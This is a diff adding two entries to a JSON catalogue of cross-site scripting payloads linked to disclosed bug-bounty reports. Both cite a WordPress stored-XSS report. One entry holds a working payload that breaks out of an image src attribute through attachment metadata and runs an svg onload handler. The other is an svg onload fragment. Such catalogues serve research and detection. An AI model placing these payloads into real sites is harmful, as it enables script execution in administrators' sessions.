@@ -27589,5 +27589,39 @@
       "bounty": null,
       "disclosed_at": "2026-08-07"
     }
+  },
+  {
+    "id": "6d810f40",
+    "class": "xss",
+    "payload": "{\"sub_sizes\":[{\"image_size\":\"thumbnail\",\n  \"file\":\"a.jpg' /><svg onload='document.title=\\\"XSS-EXECUTED-\\\"+document.domain'></svg><b x='\",\n  \"width\":150,\"height\":150,\"mime_type\":\"image/jpeg\",\"filesize\":1}]}",
+    "technique": "Stored XSS via attribute injection in the image filename (breaks out of the src attribute)",
+    "param": "file",
+    "report": {
+      "id": 3931771,
+      "url": "https://hackerone.com/reports/3931771",
+      "title": "Author \u2192 stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`",
+      "program": "WordPress",
+      "reporter": "jakubk",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-28"
+    }
+  },
+  {
+    "id": "af53af77",
+    "class": "xss",
+    "payload": "<svg onload=\u2026>",
+    "technique": "SVG onload attribute JavaScript execution (HTML injection XSS)",
+    "param": null,
+    "report": {
+      "id": 3931771,
+      "url": "https://hackerone.com/reports/3931771",
+      "title": "Author \u2192 stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`",
+      "program": "WordPress",
+      "reporter": "jakubk",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-28"
+    }
   }
 ]
